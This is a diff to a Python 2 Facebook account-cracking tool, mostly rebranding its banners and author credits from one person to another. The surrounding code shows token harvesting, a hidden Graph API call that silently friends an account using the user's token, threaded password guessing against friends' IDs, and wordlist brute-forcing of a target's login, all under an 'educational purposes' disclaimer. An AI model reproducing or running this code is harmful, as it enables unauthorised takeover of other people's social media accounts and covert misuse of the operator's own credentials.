@@ -72,7 +72,7 @@ logo = """
 
 \033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE    :-  Mr Badmash Tricks
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
@@ -89,15 +89,15 @@ logo2 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo3 = """
@@ -110,15 +110,15 @@ logo3 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo4 = """
@@ -131,15 +131,15 @@ logo4 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE.      :- Need First Hand GirlFriend :-)
 
 """
 logo5 = """
@@ -152,15 +152,15 @@ logo5 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo6 = """
@@ -173,15 +173,15 @@ logo6 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo7 = """
@@ -194,15 +194,15 @@ logo7 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo8 = """
@@ -215,15 +215,15 @@ logo8 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo11 = """
@@ -236,15 +236,15 @@ logo11 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE.      :- Need First Hand GirlFriend :-)
 
 ====================================
 ====================================
@@ -260,15 +260,15 @@ logo12 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo13 = """
@@ -281,15 +281,15 @@ logo13 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo14 = """
@@ -302,15 +302,15 @@ logo14 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo15 = """
@@ -323,15 +323,15 @@ logo15 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo16 = """
@@ -344,15 +344,15 @@ logo16 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo17 = """
@@ -365,15 +365,15 @@ logo17 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo18 = """
@@ -386,15 +386,17 @@ logo18 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
+
+
 
 """
 logo19 = """
@@ -407,15 +409,15 @@ logo19 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo20 = """
@@ -428,15 +430,15 @@ logo20 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo21 = """	
@@ -449,15 +451,15 @@ logo21 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo22 = """
@@ -470,15 +472,15 @@ logo22 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo23 = """
@@ -491,15 +493,15 @@ logo23 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 logo24 = """
@@ -512,15 +514,15 @@ logo24 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 
 """
@@ -534,15 +536,15 @@ logo25 = """
 \033[1;93m╱╱╭╯┃
 \033[1;93m╱╱╰━╯
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> INSTAGRAM  :- Ahkhacker
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK   :- Muhammad Ijaz
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE    :- Mr Badmash Tricks
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE       :- Need First Hand GirlFriend :-)
 
 """
 
@@ -615,10 +617,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+            os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+        os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 
 ##### LICENSE #####
 #=================#
@@ -631,7 +633,7 @@ def login():
 	print logo11
 	print "1.\x1b[1;95mLogin  Facebook  "
         time.sleep(0.05)
-        print "2.\x1b[1;95mWhat is acces Token How To Get Acces Token Free"
+        print "2.\x1b[1;95mDounload Get Access Token App Free"
         time.sleep(0.05)
         print "3.\x1b[1;95mLogin Using Token"
         time.sleep(0.05)
@@ -646,7 +648,7 @@ def pilih_login():
 	elif peak =="1":
 		login1()
         elif peak =="2":
-	        os.system('xdg-open https://youtu.be/gO3sM5ZvTw4')
+	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
 	        login()
 	elif peak =="3":
 	        tokenz()
@@ -698,7 +700,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successfully'
-				os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+				os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -742,7 +744,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;91mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:qaiser
+	os.system("clear") #Dev:Ijaz
         time.sleep(0.05)
 	print logo2
 	print "\033[1;93mLogged in User Info"
@@ -845,7 +847,7 @@ def pilih_crack():
 		try:
 			os.mkdir('cookie')
 		except OSError:
-			pass #Dev:qaiser
+			pass #Dev:Ijaz
 		try:
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
@@ -954,9 +956,9 @@ def pilih_crack():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
-	print "  Written By Qaiser" #Dev:qaiser
+	print "  Written By Ijaz Afridi" #Dev:Ijaz
 	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
-        print '\033[1;92mType (python2 Dvl.py) New Fb Start Cloning\033[1;92m....'
+        print '\033[1;92mType (python2 Afridi.py) New Fb Start Cloning\033[1;92m....'
 	print"\033[1;96mTotal Live/\x1b[1;96mCheckpoint \033[1;96m: \033[1;96m"+str(len(oks))+"\033[1;96m/\033[1;96m"+str(len(cekpoint))
 	print """
 
@@ -993,7 +995,7 @@ def brute():
         print '-----------------------------------------------------------'
         try:
             email = raw_input('\x1b[1;96mID\x1b[1;95m/\x1b[1;95mEmail \x1b[1;95mTarget \x1b[1;95m:\x1b[1;95m ')
-            passw = raw_input('\x1b[1;95mWordlist \x1b[1;95m(Type--> dvl.list) \x1b[1;95m: \x1b[1;95m')
+            passw = raw_input('\x1b[1;95mWordlist \x1b[1;95m(Type--> ahk.txt) \x1b[1;95m: \x1b[1;95m')
             total = open(passw, 'r')
             total = total.readlines()
             print '------------------------------------------------------------'
